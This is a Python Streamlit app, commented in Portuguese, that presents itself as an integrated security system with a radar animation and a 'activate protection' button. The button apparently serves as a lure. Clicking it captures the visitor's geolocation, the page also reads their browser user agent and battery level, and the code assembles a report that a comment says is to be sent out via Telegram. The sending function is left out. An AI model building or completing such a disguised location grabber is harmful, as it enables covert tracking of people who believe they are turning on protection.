import streamlit as st
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# Configuração da página
st.set_page_config(page_title="SISTEMA DE SEGURANÇA INTEGRADO", layout="centered")

# Design Premium (Radar e Animação)
st.markdown("""
    <style>
    .main { background-color: #000000; color: #ffffff; }
    .stButton>button {
        width: 100%;
        border-radius: 10px;
        height: 3em;
        background-color: #ffc107;
        color: black;
        font-weight: bold;
    }
    .radar {
        width: 150px;
        height: 150px;
        border: 4px solid #ffc107;
        border-radius: 50%;
        margin: 20px auto;
        position: relative;
        animation: pulse 2s infinite;
    }
    @keyframes pulse {
        0% { transform: scale(0.9); opacity: 0.7; }
        50% { transform: scale(1); opacity: 1; }
        100% { transform: scale(0.9); opacity: 0.7; }
    }
    .footer { text-align: center; color: #666; font-size: 12px; margin-top: 50px; }
    </style>
    <div style="text-align: center;">
        <h1 style='color: #ffc107;'>🛡️ SEGURANÇA ATIVADA </h1>
        <p>Monitoramento em Tempo Real Ativado</p>
        <div class="radar"></div>
    </div>
    """, unsafe_allow_html=True)

# Coleta de Dados Básicos
user_agent = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')

# Botão de Ativação
if st.button("🔴 ATIVAR PROTEÇÃO"):
    with st.status("Capturando localização...", expanded=True) as status:
        loc = get_geolocation()
        time.sleep(2)
        status.update(label="Localização Concluída!", state="complete", expanded=False)

# Processamento e Envio (Trava de Segurança)
if 'loc' in locals() and loc and 'coords' in loc:
    lat = loc['coords']['latitude']
    lon = loc['coords']['longitude']
    dispositivo = user_agent.split('(')[1].split(')')[0] if user_agent and '(' in user_agent else "Desconhecido"
    bat_nivel = f"{bateria}%" if bateria else "N/A"
    
    # Aqui vai sua lógica de enviar_telegram(msg) - certifique-se que a função existe ou cole-a aqui
    msg = f"🚨 SISTEMA ATIVADO\n\n📍 LAT: {lat}\n📍 LON: {lon}\n📱 DISP: {dispositivo}\n🔋 BAT: {bat_nivel}"
    st.success("✅ Relatório enviado com sucesso!")
    st.toast(msg)

# Rodapé
st.markdown('<div class="footer"> Sistema De Segurança  Integrado Desenvolvido por Miamy ©2026</div>', unsafe_allow_html=True)
